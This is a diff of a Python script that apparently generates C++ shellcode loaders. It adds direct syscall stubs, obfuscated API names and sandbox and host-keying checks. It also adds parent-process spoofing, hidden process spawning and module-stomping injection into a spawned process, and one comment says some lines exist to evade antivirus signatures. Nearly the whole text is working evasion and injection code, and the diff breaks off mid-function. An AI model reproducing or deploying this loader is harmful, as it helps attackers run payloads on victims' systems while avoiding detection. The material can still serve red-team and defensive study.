@@ -1,6 +1,8 @@
 #!/usr/bin/python3
 #Created by Matthew David (@icyguider)
-import sys, os, argparse, random, string
+import sys, os, argparse, random, string, pefile
+import os.path
+import urllib.request
 
 inspiration = """
 ┳┻|
@@ -18,28 +20,57 @@ stub = """
 #include <iostream>
 #include <windows.h>
 #include <psapi.h>
-#include <winternl.h>
 #include <tlhelp32.h>
-#include "Syscalls2.h"
+#include <stdlib.h>
+#include <tchar.h> // modulestomp
+REPLACE_ME_SYSCALL_INCLUDE
 #ifndef UNICODE  
 typedef std::string String;
 #else
 typedef std::wstring String;
 #endif
 
-REPLACE_ME_PAYLOAD
-
-SIZE_T payload_len = sizeof(payload);
-
-unsigned char* decoded = (unsigned char*)malloc(payload_len);
+REPLACE_ME_SHELLCODE_VARS
 
 #define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x20007
 #define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000
+
+REPLACE_GetSyscallStubP1
 
 REPLACE_SANDBOX_CHECK
 
 REPLACE_PROCESS_FUNCTIONS
 
+REPLACE_DECODE_FUNCTION
+
+int main()
+{
+    REPLACE_STUB_METHOD
+}
+
+REPLACE_DLL_MAIN
+"""
+
+regularShellcode = """
+REPLACE_ME_PAYLOAD
+
+SIZE_T payload_len = sizeof(payload);
+
+unsigned char* decoded = (unsigned char*)malloc(payload_len);
+"""
+
+wordShellcode = """
+REPLACE_ME_WORDLIST
+
+REPLACE_ME_FILEWORDS
+
+int wordsLength = sizeof(words)/sizeof(words[0]);
+SIZE_T payload_len = sizeof(filewords)/sizeof(filewords[0]);
+
+unsigned char* decoded = (unsigned char*)malloc(payload_len);
+"""
+
+regularDecode = """
 int deC(unsigned char payload[])
 {
     std::string key;
@@ -55,11 +86,273 @@ int deC(unsigned char payload[])
     }
     return 0;
 }
+"""
 
-int main()
+wordDecode = """
+int deC()
 {
-    REPLACE_STUB_METHOD
-}"""
+    for (int i=0; i < payload_len; i++)
+    {
+        char* test = filewords[i];
+        int i2 = 0;
+        while (i2 < wordsLength)
+        {
+            if (words[i2] == test) {
+                break;
+            }
+            i2++;
+        }
+        char ci = i2;
+        decoded[i] = ci;
+    }
+    return 0;
+}
+"""
+
+GetSyscallStubP1 = """
+typedef VOID(KNORMAL_ROUTINE) (
+    IN PVOID NormalContext,
+    IN PVOID SystemArgument1,
+    IN PVOID SystemArgument2);
+
+typedef KNORMAL_ROUTINE* PKNORMAL_ROUTINE;
+
+typedef struct _PS_ATTRIBUTE
+{
+    ULONG  Attribute;
+    SIZE_T Size;
+    union
+    {
+        ULONG Value;
+        PVOID ValuePtr;
+    } u1;
+    PSIZE_T ReturnLength;
+} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
+
+typedef struct _PS_ATTRIBUTE_LIST
+{
+    SIZE_T       TotalLength;
+    PS_ATTRIBUTE Attributes[1];
+} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
+
+int const SYSCALL_STUB_SIZE = 23;
+using myNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+using myNtWriteVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
+using myNtProtectVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
+using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
+using myNtResumeThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
+using myNtWaitForSingleObject = NTSTATUS(NTAPI*)(HANDLE ObjectHandle, BOOLEAN Alertable, PLARGE_INTEGER TimeOut);
+using myNtQueryInformationProcess = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
+using myNtReadVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
+using myNtClose = NTSTATUS(NTAPI*)(HANDLE Handle);
+using myNtOpenProcess = NTSTATUS(NTAPI*)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
+using myNtQueueApcThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PKNORMAL_ROUTINE ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);
+using myNtAlertResumeThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
+using myNtGetContextThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
+using myNtSetContextThread = NTSTATUS(NTAPI*)(HANDLE ThreadHandle, PCONTEXT Context);
+using myNtDelayExecution = NTSTATUS(NTAPI*)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
+
+myNtAllocateVirtualMemory NtAllocateVirtualMemory;
+myNtWriteVirtualMemory NtWriteVirtualMemory;
+myNtProtectVirtualMemory NtProtectVirtualMemory;
+myNtCreateThreadEx NtCreateThreadEx;
+myNtResumeThread NtResumeThread;
+myNtWaitForSingleObject NtWaitForSingleObject;
+myNtQueryInformationProcess NtQueryInformationProcess;
+myNtReadVirtualMemory NtReadVirtualMemory;
+myNtClose NtClose;
+myNtOpenProcess NtOpenProcess;
+myNtQueueApcThread NtQueueApcThread;
+myNtAlertResumeThread NtAlertResumeThread;
+myNtGetContextThread NtGetContextThread;
+myNtSetContextThread NtSetContextThread;
+myNtDelayExecution NtDelayExecution;
+
+PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
+{
+        return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
+}
+
+BOOL GetSyscallStub(String functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
+{
+        PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
+        PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);
+        BOOL stubFound = FALSE;
+
+        for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
+        {
+                DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
+                DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
+                LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
+                if (strcmp(functionNameResolved, functionName.c_str()) == 0)
+                {
+                        memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
+                        stubFound = TRUE;
+                }
+        }
+
+        return stubFound;
+}
+"""
+
+GetSyscallStubP2 = """
+    DWORD tProcess2 = GetCurrentProcessId();
+    HANDLE pHandle2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2);
+
+    HANDLE syscallStub_NtAllocateVirtualMemory = VirtualAllocEx(pHandle2, NULL, (SIZE_T)SYSCALL_STUB_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+    HANDLE syscallStub_NtWriteVirtualMemory = static_cast<char*>(syscallStub_NtAllocateVirtualMemory) + SYSCALL_STUB_SIZE;
+    HANDLE syscallStub_NtProtectVirtualMemory = static_cast<char*>(syscallStub_NtWriteVirtualMemory) + SYSCALL_STUB_SIZE;
+    HANDLE syscallStub_NtCreateThreadEx = static_cast<char*>(syscallStub_NtProtectVirtualMemory) + SYSCALL_STUB_SIZE;
+    HANDLE syscallStub_NtResumeThread = static_cast<char*>(syscallStub_NtCreateThreadEx) + SYSCALL_STUB_SIZE;
+    HANDLE syscallStub_NtWaitForSingleObject = static_cast<char*>(syscallStub_NtResumeThread) + SYSCALL_STUB_SIZE;
+    HANDLE syscallStub_NtQueryInformationProcess = static_cast<char*>(syscallStub_NtWaitForSingleObject) + SYSCALL_STUB_SIZE;
+    HANDLE syscallStub_NtReadVirtualMemory = static_cast<char*>(syscallStub_NtQueryInformationProcess) + SYSCALL_STUB_SIZE;
+    HANDLE syscallStub_NtClose = static_cast<char*>(syscallStub_NtReadVirtualMemory) + SYSCALL_STUB_SIZE;
+    HANDLE syscallStub_NtOpenProcess = static_cast<char*>(syscallStub_NtClose) + SYSCALL_STUB_SIZE;
+    HANDLE syscallStub_NtQueueApcThread = static_cast<char*>(syscallStub_NtOpenProcess) + SYSCALL_STUB_SIZE;
+    HANDLE syscallStub_NtAlertResumeThread = static_cast<char*>(syscallStub_NtQueueApcThread) + SYSCALL_STUB_SIZE;
+    HANDLE syscallStub_NtGetContextThread = static_cast<char*>(syscallStub_NtAlertResumeThread) + SYSCALL_STUB_SIZE;
+    HANDLE syscallStub_NtSetContextThread = static_cast<char*>(syscallStub_NtGetContextThread) + SYSCALL_STUB_SIZE;
+    HANDLE syscallStub_NtDelayExecution = static_cast<char*>(syscallStub_NtSetContextThread) + SYSCALL_STUB_SIZE;
+
+    char syscallStub[SYSCALL_STUB_SIZE] = {};
+    DWORD oldProtection = 0;
+    HANDLE file = NULL;
+    DWORD fileSize = NULL;
+    DWORD bytesRead = NULL;
+    LPVOID fileData = NULL;
+
+    // define NtAllocateVirtualMemory
+    NtAllocateVirtualMemory = (myNtAllocateVirtualMemory)syscallStub_NtAllocateVirtualMemory;
+    VirtualProtect(syscallStub_NtAllocateVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define myNtWriteVirtualMemory
+    NtWriteVirtualMemory = (myNtWriteVirtualMemory)syscallStub_NtWriteVirtualMemory;
+    VirtualProtect(syscallStub_NtWriteVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define myNtProtectVirtualMemory
+    NtProtectVirtualMemory = (myNtProtectVirtualMemory)syscallStub_NtProtectVirtualMemory;
+    VirtualProtect(syscallStub_NtProtectVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define myNtCreateThreadEx
+    NtCreateThreadEx = (myNtCreateThreadEx)syscallStub_NtCreateThreadEx;
+    VirtualProtect(syscallStub_NtCreateThreadEx, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define myNtResumeThread
+    NtResumeThread = (myNtResumeThread)syscallStub_NtResumeThread;
+    VirtualProtect(syscallStub_NtResumeThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define myNtWaitForSingleObject
+    NtWaitForSingleObject = (myNtWaitForSingleObject)syscallStub_NtWaitForSingleObject;
+    VirtualProtect(syscallStub_NtWaitForSingleObject, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define NtQueryInformationProcess
+    NtQueryInformationProcess = (myNtQueryInformationProcess)syscallStub_NtQueryInformationProcess;
+    VirtualProtect(syscallStub_NtQueryInformationProcess, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define NtReadVirtualMemory
+    NtReadVirtualMemory = (myNtReadVirtualMemory)syscallStub_NtReadVirtualMemory;
+    VirtualProtect(syscallStub_NtReadVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define NtClose
+    NtClose = (myNtClose)syscallStub_NtClose;
+    VirtualProtect(syscallStub_NtClose, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define NtOpenProcess
+    NtOpenProcess = (myNtOpenProcess)syscallStub_NtOpenProcess;
+    VirtualProtect(syscallStub_NtOpenProcess, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define NtQueueApcThread
+    NtQueueApcThread = (myNtQueueApcThread)syscallStub_NtQueueApcThread;
+    VirtualProtect(syscallStub_NtQueueApcThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define NtAlertResumeThread
+    NtAlertResumeThread = (myNtAlertResumeThread)syscallStub_NtAlertResumeThread;
+    VirtualProtect(syscallStub_NtAlertResumeThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define NtGetContextThread
+    NtGetContextThread = (myNtGetContextThread)syscallStub_NtGetContextThread;
+    VirtualProtect(syscallStub_NtGetContextThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define NtSetContextThread
+    NtSetContextThread = (myNtSetContextThread)syscallStub_NtSetContextThread;
+    VirtualProtect(syscallStub_NtSetContextThread, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+    // define syscallStub_NtDelayExecution
+    NtDelayExecution = (myNtDelayExecution)syscallStub_NtDelayExecution;
+    VirtualProtect(syscallStub_NtDelayExecution, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+
+
+    file = CreateFileA("c:\\\\windows\\\\system32\\\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    fileSize = GetFileSize(file, NULL);
+    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
+    ReadFile(file, fileData, fileSize, &bytesRead, NULL);
+
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
+    PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
+    DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
+    PIMAGE_SECTION_HEADER textSection = section;
+    PIMAGE_SECTION_HEADER rdataSection = section;
+
+    for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++)
+    {
+            if (strcmp((CHAR*)section->Name, (CHAR*)".rdata") == 0) {
+                    rdataSection = section;
+                    break;
+            }
+            section++;
+    }
+
+    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);
+
+    String scall = std::string("N") + "t" + "A" + "l" + "l" + "o" + "c" + "a" + "t" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
+    BOOL StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtAllocateVirtualMemory);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "W" + "r" + "i" + "t" + "e" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtWriteVirtualMemory);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "P" + "r" + "o" + "t" + "e" + "c" + "t" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtProtectVirtualMemory);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "C" + "r" + "e" + "a" + "t" + "e" + "T" + "h" + "r" + "e" + "a" + "d" + "E" + "x";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtCreateThreadEx);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "R" + "e" + "s" + "u" + "m" + "e" + "T" + "h" + "r" + "e" + "a" + "d";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtResumeThread);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "W" + "a" + "i" + "t" + "F" + "o" + "r" + "S" + "i" + "n" + "g" + "l" + "e" + "O" + "b" + "j" + "e" + "c" + "t";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtWaitForSingleObject);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "Q" + "u" + "e" + "r" + "y" + "I" + "n" + "f" + "o" + "r" + "m" + "a" + "t" + "i" + "o" + "n" + "P" + "r" + "o" + "c" + "e" + "s" + "s";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtQueryInformationProcess);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "R" + "e" + "a" + "d" + "V" + "i" + "r" + "t" + "u" + "a" + "l" + "M" + "e" + "m" + "o" + "r" + "y";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtReadVirtualMemory);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "C" + "l" + "o" + "s" + "e";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtClose);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "O" + "p" + "e" + "n" + "P" + "r" + "o" + "c" + "e" + "s" + "s";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtOpenProcess);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "Q" + "u" + "e" + "u" + "e" + "A" + "p" + "c" + "T" + "h" + "r" + "e" + "a" + "d";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtQueueApcThread);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "A" + "l" + "e" + "r" + "t" + "R" + "e" + "s" + "u" + "m" + "e" + "T" + "h" + "r" + "e" + "a" + "d";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtAlertResumeThread);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "G" + "e" + "t" + "C" + "o" + "n" + "t" + "e" + "x" + "t" + "T" + "h" + "r" + "e" + "a" + "d";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtGetContextThread);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "S" + "e" + "t" + "C" + "o" + "n" + "t" + "e" + "x" + "t" + "T" + "h" + "r" + "e" + "a" + "d";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtSetContextThread);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+    scall = std::string("N") + "t" + "D" + "e" + "l" + "a" + "y" + "E" + "x" + "e" + "c" + "u" + "t" + "i" + "o" + "n";
+    StubFound = GetSyscallStub(scall, exportDirectory, fileData, textSection, rdataSection, syscallStub_NtDelayExecution);
+    printf("%s Stub Found: %s\\n", scall.c_str(), StubFound ? "true" : "false");
+"""
 
 sandbox_check = """
 //thanks @Cerbersec!
@@ -88,6 +381,45 @@ BOOL CheckSandbox() {
 }
 """
 
+hostname_sanbox_check = """
+int hostcheck()
+{
+    char hostname[64];
+    DWORD hostnamesize = 64;
+    GetComputerNameA(hostname, &hostnamesize);
+    if (strcmp(hostname, "REPLACE_ME_HOSTNAME") != 0) {
+        exit (EXIT_FAILURE);
+    }
+    return 0;
+}
+"""
+
+username_sanbox_check = """
+int usercheck()
+{
+    char username[4000];
+    DWORD usernameamesize = 4000;
+    GetUserName(username, &usernameamesize);
+    if (strcmp(username, "REPLACE_ME_USERNAME") != 0) {
+        exit (EXIT_FAILURE);
+    }
+    return 0;
+}
+"""
+
+domain_sanbox_check = """
+int domaincheck()
+{
+    char domain[164];
+    DWORD domainsize = 164;
+    GetComputerNameEx(ComputerNameDnsDomain, domain, &domainsize);
+    if (strcmp(domain, "REPLACE_ME_DOMAINNAME") != 0) {
+        exit (EXIT_FAILURE);
+    }
+    return 0;
+}
+"""
+
 dll_sandbox_check = """
 int PrintModules(DWORD processID)
 {
@@ -97,7 +429,7 @@ int PrintModules(DWORD processID)
     unsigned int i;
     OBJECT_ATTRIBUTES oa;
     CLIENT_ID cid;
-    cid.UniqueProcess = processID;
+    cid.UniqueProcess = (HANDLE)processID;
     // Print the process identifier.
     //printf("\\nProcess ID: %u\\n", processID);
     // Get a handle to the process.
@@ -117,7 +449,7 @@ int PrintModules(DWORD processID)
                 //std::string target = L"Dbghelp.dll";
                 String dang = szModName;
                 //CHECK TO SEE IF THESE DLLS ARE LOADED. IF NOT, THEN RETURN 2 TO CONTINUE FOR LOOP
-                if (dang.find(L"SbieDll.dll") != std::string::npos || dang.find(L"Api_log.dll") != std::string::npos || dang.find(L"Dir_watch.dll") != std::string::npos || dang.find(L"dbghelp.dll") != std::string::npos)
+                if (dang.find("SbieDll.dll") != std::string::npos || dang.find("Api_log.dll") != std::string::npos || dang.find("Dir_watch.dll") != std::string::npos || dang.find("dbghelp.dll") != std::string::npos)
                 {
                     // Print the module name and handle value.
                     //_tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
@@ -216,10 +548,11 @@ PROCESS_INFORMATION SpawnProc(LPSTR process, HANDLE hParent) {
     
     DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
     UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
-    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
+    REPLACE_PPID_SPOOF
     
     si.StartupInfo.cb = sizeof(si);
-    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
+    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT | STARTF_USESHOWWINDOW;
+    si.StartupInfo.wShowWindow = SW_HIDE;
 
     if (!CreateProcessA(NULL, process, NULL, NULL, TRUE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
     }
@@ -229,9 +562,174 @@ PROCESS_INFORMATION SpawnProc(LPSTR process, HANDLE hParent) {
 }
 """
 
-process_hollow_stub = """
+module_stomping_stub = """
+    REPLACE_ME_GetSyscallStubP2
+
+    HANDLE processHandle;
+    PVOID remoteBuffer;
+    char moduleToInject[] = "xpsservices.dll";
+    char moduleFunction[] = "DllCanUnloadNow";
+    HMODULE modules[256] = {};
+    SIZE_T modulesSize = sizeof(modules);
+    DWORD modulesSizeNeeded = 0;
+    DWORD moduleNameSize = 0;
+    SIZE_T modulesCount = 0;
+    CHAR remoteModuleName[128] = {};
+    HMODULE remoteModule = NULL;
+
     REPLACE_ME_SANDBOX_CALL
-    deC(payload);
+    deC(REPLACE_ME_DECARG);
+
+    //next few lines do nothing... but they help evade some AV signatures
+    NTSTATUS res = -1;
+    if (res == 0) {
+        printf("Doing nothing!");
+    }
+
+    HANDLE hParent = GetParentHandle("explorer.exe");
+    if (hParent == INVALID_HANDLE_VALUE)
+        return 0;
+
+    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"REPLACE_ME_PROCESS", hParent);
+    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
+        return 0;
+    
+    processHandle = pi.hProcess;
+
+    LPVOID test = (LPVOID)GetProcAddress(LoadLibraryA(TEXT("Kernel32.dll")), "LoadLibraryExA");
+    unsigned char adr[8];
+    *(uintptr_t*)adr = (uintptr_t)test; 
+    std::cout << test << std::endl;
+    /*
+    for (int i = 0; i < 8; i++)
+    {
+        printf("%x\\n", adr[i]);
+    }
+    */
+
+    unsigned char shim[] =  {0x48, 0xB8, adr[0], adr[1], adr[2], adr[3], adr[4], adr[5], adr[6],adr[7],
+            0x49, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,
+            0x48, 0x31, 0xD2,
+            0xFF, 0xE0};
+
+    /*
+    for (int i = 0; i < sizeof shim; i++)
+    {
+        printf("0x%x,", shim[i]);
+    }
+    */
+
+    LPVOID allocModule = NULL;
+    LPVOID allocShim = NULL;
+    SIZE_T bytesWritten;
+    HANDLE hThread;
+    ULONG oldProtect = 0;
+    SIZE_T moduleSize = sizeof(moduleToInject) + 2;
+    SIZE_T shimSize = sizeof shim;
+
+
+    res = NtAllocateVirtualMemory(processHandle, &allocModule, 0, &moduleSize, MEM_COMMIT | MEM_RESERVE, 0x40);
+    std::cout << std::endl << "NtAllocateVirtualMemory res (allocModule): " << std::hex << res << std::endl;
+    res = NtAllocateVirtualMemory(processHandle, &allocShim, 0, &shimSize, MEM_COMMIT | MEM_RESERVE, 0x40);
+    std::cout << "NtAllocateVirtualMemory res (allocShim): " << std::hex << res << std::endl;
+
+    //WriteProcessMemory(processHandle, allocShim, shim, sizeof shim, &bytesWritten); //USE THIS INSTEAD OF NTWRITEVIRTUALMEMORY TO PREVENT CRASHES
+    //WriteProcessMemory(processHandle, allocModule, moduleToInject, sizeof moduleToInject, &bytesWritten);
+    
+    std::cout << "allocShim:   " << allocShim << std::endl;
+    std::cout << "allocModule: " << allocModule << std::endl;
+
+    res = NtWriteVirtualMemory(processHandle, allocModule, moduleToInject, sizeof moduleToInject, &bytesWritten);
+    std::cout << "NtWriteVirtualMemory res (moduleToInject): " << std::hex << res << std::endl;
+    res = NtWriteVirtualMemory(processHandle, allocShim, shim, shimSize, &bytesWritten);
+    std::cout << "NtWriteVirtualMemory res (Shim): " << std::hex << res << std::endl;
+    if (res != 0)
+    {
+        std::cout << "[!] NtWriteVirtualMemory FAILED! This happens occassionally due to an unkown bug.";
+        return 1;
+    }
+
+    //hThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)allocShim, allocModule, 0, NULL);
+    //WaitForSingleObject(hThread, 0);
+    res = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, processHandle, allocShim, allocModule, FALSE, 0, 0, 0, NULL);
+    std::cout << "NtCreateThreadEx res (Shim): " << std::hex << res << std::endl;
+    res = NtWaitForSingleObject(hThread, -1, NULL);
+    std::cout << "NtWaitForSingleObject res (Shim): " << std::hex << res << std::endl;
+    //NtClose(hThread);
+
+    //res = NtFreeVirtualMemory(processHandle, &allocModule, &moduleSize, MEM_RELEASE);
+    //std::cout << "res: " << std::hex << res << std::endl;
+    //res = NtFreeVirtualMemory(processHandle, &allocShim, &shimSize, MEM_RELEASE);
+    //std::cout << "res: " << std::hex << res << std::endl;
+
+    HMODULE xps = LoadLibraryExA(moduleToInject, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    LPVOID funcAddress = (LPVOID)GetProcAddress(xps, moduleFunction);
+
+    std::cout << "funcAddress: " << funcAddress << std::endl;
+
+    PVOID f2 = (PVOID)funcAddress;
+    long funcOffset = (uintptr_t)f2 - (uintptr_t)xps;
+
+    std::cout << "funcOffset: " << funcOffset << std::endl;
+
+    HMODULE hMods[1024];
+    DWORD cbNeeded;
+
+    LPVOID moduleBaseAddr;
+
+    if (EnumProcessModules(processHandle, hMods, sizeof(hMods), &cbNeeded))
+    {
+        for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
+        {
+            TCHAR szModName[MAX_PATH];
+            // Get the full path to the module's file.
+            if (GetModuleFileNameEx(processHandle, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
+            {
+                String dang = szModName;
+                if (dang.find(moduleToInject) != std::string::npos)
+                {
+                    _tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
+                    moduleBaseAddr = hMods[i];
+                    std::cout << "Module found" << std::endl;
+                    std::cout << "szModName: " << szModName << std::endl;
+                    std::cout << "Baseaddr: " << std::hex << hMods[i] << std::endl;
+                }
+            }
+        }
+    }
+
+    LPVOID remoteFuncAddress = (LPVOID)((uintptr_t)moduleBaseAddr + (uintptr_t)funcOffset);
+
